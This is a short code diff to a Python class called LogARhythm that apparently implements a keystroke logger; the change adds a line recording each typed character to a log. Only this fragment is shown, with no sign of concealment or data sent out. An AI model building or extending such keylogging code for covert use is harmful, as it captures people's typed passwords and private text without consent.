@@ -17,6 +17,7 @@ class LogARhythm:
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
+            self.append_to_log(current_key)
         except AttributeError:
             if key == key.space:
                 current_key = " "
